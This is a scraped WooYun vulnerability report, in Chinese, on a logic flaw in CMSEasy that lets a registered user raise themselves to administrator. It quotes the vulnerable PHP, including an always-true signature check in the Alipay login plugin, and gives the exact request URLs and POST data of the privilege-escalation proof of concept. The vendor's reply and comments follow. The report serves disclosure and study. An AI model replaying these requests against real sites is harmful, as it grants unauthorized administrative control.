{"id": 46981, "wybug_id": "wooyun-2014-081934", "wybug_title": "cmseasy 逻辑缺陷可升级普通用户为管理员(shell还会难吗)", "wybug_corp": "cmseasy", "wybug_author": "menmen519", "wybug_date": "2014-11-10 10:01", "wybug_open_date": "2015-02-08 10:02", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["逻辑错误"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-10：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-11-13：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-01-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-01-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-02-08：\t细节向公众公开  简要描述： cmseasy 逻辑缺陷可升级普通用户为管理员 详细说明：  user_act.php(130-155):\nif (front::post('submit')) {            if (front::post('username') && front::post('password')) {                $username = front::post('username');                $password = md5(front::post('password'));                $data = array(                    'username' => $username,                    'password' => $password,                );                $user = new user();                $row = $user->getrow(array('username' => $data['username'], 'password' => $data['password']));                if (!is_array($row)) {                    $this->login_false();                    return;                }                $post[$classname] = session::get('openid');                $this->_user->rec_update($post, 'userid=' . $row['userid']);                cookie::set('login_username', $row['username']);                cookie::set('login_password', front::cookie_encode($row['password']));                session::set('username', $row['username']);                front::redirect(url::create('user'));                return;            } else {                $this->login_false();                return;            }        }\n第一步 我们注册一个为test 密码为 111111的用户然后发送url：http://localhost/uploads/index.php?case=user&act=respond&ologin_code=groupidpostdata:username=test&password=111111&submit=xxx第二步：$post[$classname] = session::get('openid');这里 我们给$post传递进去了groupid 但是有个问题 session::get('openid') 并不存在 所以执行后 test用户的groupid 为0 那么下来我们在继续找一下line 157-172:\ninclude_once ROOT.'/lib/plugins/ologin/'.$classname.'.php';        $ologinobj = new $classname();        $status = $ologinobj->respond();        //var_dump(session::get('openid'));exit;        $where[$classname] = session::get('openid');        if(!$where[$classname]) front::redirect(url::create('user'));        $user = new user();        $data = $user->getrow($where);        if(!$data){            $this->view->data = $status;        }else{            cookie::set('login_username',$data['username']);            cookie::set('login_password',front::cookie_encode($data['password']));            session::set('username',$data['username']);            front::redirect(url::create('user'));        }\n这里我们看看是不是要写session 其他的认证信息 我们都忽略 我们只关心这里的openid生效不 可控不当$classname为alipaylogin.php时候 我们跟进去\nfunction respond() {                ini_set(\"display_errors\",\"On\");        $where = array('ologin_code'=>front::$get['ologin_code']);        $ologins = ologin::getInstance()->getrows($where);        $ologin = unserialize_config($ologins[0]['ologin_config']);        //var_dump($ologin);                $aliapy_config['partner'] = $ologin['alipaylogin_id'];        $aliapy_config['key'] = $ologin['alipaylogin_key'];        $aliapy_config['return_url'] = ologin::url(basename(__FILE__,'.php'));        $aliapy_config['sign_type']    = 'MD5';        $aliapy_config['input_charset']= 'utf-8';        $aliapy_config['transport']    = 'http';        $aliapy_config['cacert']    = getcwd().'/lib/plugins/alipayauth/cacert.pem';        //var_dump($aliapy_config);        unset($_GET['case']);unset($_GET['act']);unset($_GET['ologin_code']);unset($_GET['site']);        require_once(\"alipayauth/alipay_notify.class.php\");        $alipayNotify = new AlipayNotify($aliapy_config);        //var_dump($alipayNotify);        $verify_result = $alipayNotify->verifyReturn();        //var_dump($verify_result);                if(true || $verify_result) {//验证成功            $user_id = front::$get['user_id'];            $token = front::$get['token'];            session::set('access_token',$token);            session::set(\"openid\",$user_id);            return array('nickname'=>  front::get('real_name'));\nif(true || $verify_result) {//验证成功 这一行我们让它永远成立 因为在这之前全是配置信息的东西我们直接看这里\n$user_id = front::$get['user_id'];            $token = front::$get['token'];            session::set('access_token',$token);            session::set(\"openid\",$user_id);            return array('nickname'=>  front::get('real_name'))\n发现没有openid完全可控制我们发送url：http://localhost/uploads/index.php?case=user&act=respond&ologin_code=alipaylogin&user_id=2&real_name=test这时候我们的openid被设置为了2那么我们回头在看看发送url:http://localhost/uploads/index.php?case=user&act=respond&ologin_code=groupidpostdata:username=test&password=111111&submit=xxx这时候 看看 我们的test用户组为：\n\n我们在登陆后台看看\n\n   漏洞证明：     修复方案：     版权声明：转载请注明来源 menmen519@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：1  确认时间：2014-11-10 10:16 厂商回复： 漏洞已经通过其他渠道得知，切所有描述相同。。。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-11-10 10:03 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  叼    \n     2014-11-10 10:08 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:79        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  叼    \n     2014-11-10 10:15 |    \t\t玉林嘎 \t\t\t( 普通白帽子  |\t\t\t        Rank:758 漏洞数:96        )\t\t \n  叼    \n     2014-11-10 10:23 |    \t\tluwikes \t\t\t( 普通白帽子  |\t\t\t        Rank:512 漏洞数:77        | 潜心学习~~~)\t\t \n  厂商好恶心    \n     2014-11-10 10:24 |    \t\t進撃のDanny \t\t\t( 实习白帽子  |\t\t\t        Rank:81 漏洞数:7        )\t\t \n  目测是这个 http://loudong.360.cn/vul/info/id/31552    \n     2014-11-10 16:12 |    \t\tlaoyao \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:5        | ด้้้้้็็็็็้้้้้็็็็...)\t\t \n  吊 ，    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 1, "Ranks": null}